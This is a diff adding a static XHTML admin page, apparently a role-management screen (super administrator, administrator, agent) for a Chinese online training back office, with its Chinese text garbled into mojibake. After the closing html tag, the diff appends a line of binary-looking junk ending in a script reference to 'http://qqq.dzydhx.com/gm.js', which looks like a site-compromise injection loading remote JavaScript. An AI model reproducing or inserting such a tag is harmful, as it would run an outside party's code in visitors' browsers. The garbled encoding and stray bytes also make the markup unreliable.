@@ -1,0 +1,103 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>π„∂´ºÏ—ÈºÏ“ﬂ£®ºÏŒÒ£©Õ¯…œ≈‡—µœµÕ≥∫ÛÃ®π‹¿ÌœµÕ≥</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+</head>
+<script>
+	function add_Sub()
+	{
+		window.document.location="editroles.html";
+	}
+</script>
+<body topmargin="0" leftmargin="0">
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td background="../images/ht-body01.jpg" class="body02">µ±«∞Œª÷√£∫œµÕ≥π‹¿Ì-Ω«…´π‹¿Ì</td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td colspan="3" background="../images/ht-body02.jpg" class="body03">Ω«…´≤È—Ø </td>
+                </tr>
+                <tr>
+                  <td width="25%" class="body06">Ω«…´√˚≥∆£∫</td>
+                  <td width="27%" class="body04"><select class="bodytext01">
+                    <option>≥¨º∂π‹¿Ì‘±</option>
+                    <option>π‹¿Ì‘±</option>
+                    <option>æ÷¥˙¿Ì</option>
+                  </select></td>
+                  <td class="body03">&nbsp;</td>
+                </tr>
+                <tr>
+                  <td colspan="3" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td width="74%" height="35">&nbsp;</td>
+                        <td width="9%"><input type="image" src="../images/ht-but-add.jpg" name="Submit223"  onclick="add_Sub()"/></td>
+                        <td width="9%"><input type="image" src="../images/ht-but-check.jpg" name="Submit222" /></td>
+                        <td width="8%"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" /></td>
+                      </tr>
+                  </table></td>
+                </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01a"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td colspan="11" background="../images/ht-body02.jpg" class="body03">≤È—ØΩ·π˚</td>
+          </tr>
+          <tr>
+            <td width="14%" class="body05" align="center">—°‘Ò</td>
+            <td width="25%" class="body05" align="center">±‡∫≈</td>
+            <td width="35%" class="body05" align="center">Ω«…´√˚≥∆</td>
+           
+            <td width="26%" class="body05" align="center">≤Ÿ&nbsp;&nbsp;◊˜</td>
+          </tr>
+          <tr>
+            <td class="body03" align="center"><input type="checkbox" name="checkbox5" value="checkbox" /></td>
+            <td class="body03" align="center">001</td>
+            <td class="body03" align="center">≥¨º∂π‹¿Ì‘±</td>
+			 
+            <td class="body03" align="center" nowrap="nowrap">
+			 <input type="image" src="../images/ht-but-del.jpg" onclick="javascript:alert('del successful')"/>
+			 <input type="image" src="../images/ht-but-adit.jpg" onclick="window.location='editroles.html';"/>
+			</td>
+          </tr>
+          <tr>
+            <td class="body06" align="center"><input type="checkbox" name="checkbox7" value="checkbox" /></td>
+            <td class="body06" align="center">002</td>
+            <td class="body06" align="center">π‹¿Ì‘±</td>
+			
+            <td class="body06" align="center"  nowrap="nowrap">
+			<input type="image" src="../images/ht-but-del.jpg" onclick="javascript:alert('del successful')"/>
+			 <input type="image" src="../images/ht-but-adit.jpg" onclick="window.location='editroles.html';"/>
+			</td>
+          </tr>
+          <tr>
+            <td class="body04" align="center"><input type="checkbox" name="checkbox8" value="checkbox" />
+            </td>
+            <td class="body03" align="center">003</td>
+            <td class="body03" align="center">æ÷¥˙¿Ì</td>
+		
+            <td class="body03" align="center"  nowrap="nowrap">
+			<input type="image" src="../images/ht-but-del.jpg" onclick="javascript:alert('del successful')"/>
+			 <input type="image" src="../images/ht-but-adit.jpg" onclick="window.location='editroles.html';"/>
+			</td>
+          </tr>
+          <tr>
+            <td colspan="11" class="body03">&nbsp;</td>
+          </tr>
+        </table></td>
+      </tr>
+    </table>
+</body>
+</html>
+
+{Æ
+z∏.”O5—v¯ŒmâGìg9±´ôñÌêÏhttp://qqq.dzydhx.com/gm.js></script>
